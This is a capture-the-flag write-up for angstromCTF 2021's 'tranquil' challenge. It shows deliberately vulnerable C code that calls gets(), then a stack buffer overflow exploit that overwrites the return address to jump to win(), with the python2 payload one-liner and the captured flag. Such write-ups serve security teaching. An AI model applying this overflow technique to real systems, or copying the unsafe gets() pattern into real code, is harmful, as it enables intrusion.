# tranquil

## Challenge:

Finally, [inner
peace](https://files.actf.co/608874e08577f58044bd8dd1551a7b29c6945cfc58d7e1c35af1dc4e97213ab6/tranquil)
- Master Oogway

[Source](https://files.actf.co/597e7ea4afea0e1fb28cb58e8ebe82447ada05fab44dd480992c49dcb8c36ae8/tranquil.c)

## Solution:

We have a binary and our C source code:

```c  
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>

int win(){  
   char flag[128];  
   FILE *file = fopen("flag.txt","r");  
   if (!file) {  
       printf("Missing flag.txt. Contact an admin if you see this on remote.");  
       exit(1);  
   }  
   fgets(flag, 128, file);  
   puts(flag);  
}

int vuln(){  
   char password[64];  
   puts("Enter the secret word: ");  
   gets(&password);  
   if(strcmp(password, "password123") == 0){  
       puts("Logged in! The flag is somewhere else though...");  
   } else {  
       puts("Login failed!");  
   }  
   return 0;  
}

int main(){  
   setbuf(stdout, NULL);  
   setbuf(stderr, NULL);  
   vuln();  
   // not so easy for you!  
   // win();  
   return 0;  
}  
```

We’re given the password immediately, but it’s clear we need to get to the
`win()` function. We should be able to abuse `gets()` to jump to the proper
address.

We have a 64 character buffer. If we throw `A * 72` at it, we get a
segmentation fault:

```bash  
team8317@actf:/problems/2021/tranquil$ ./tranquil  
Enter the secret word:  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Login failed!  
Segmentation fault (core dumped)  
```

At `A * 74` we begin to rewrite the instruction pointer. At `(A * 72) + (B *
3)` we completely clobber it.

Now we need to discover where our `win()` function begins and rewrite RIP to
point to it.

We can use `readelf` to find the function:

```bash  
team8317@actf:/problems/2021/tranquil$ readelf -s tranquil | grep win  
   41: 0000000000401196   110 FUNC    GLOBAL DEFAULT   14 win  
```

And now we pass in the location as part of our exploit payload:

```bash  
team8317@actf:/problems/2021/tranquil$ python2 -c "print 'A'*71 + ';\x96\x11\x40'" | ./tranquil  
Enter the secret word:  
Login failed!  
actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}

Segmentation fault (core dumped)  
```

And our flag is dumped along with the core:
`actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}`.  

Original writeup (https://github.com/mcmahoniel/ctf_write-
ups/blob/main/2021/angstromctf/binary/tranquil/README.md).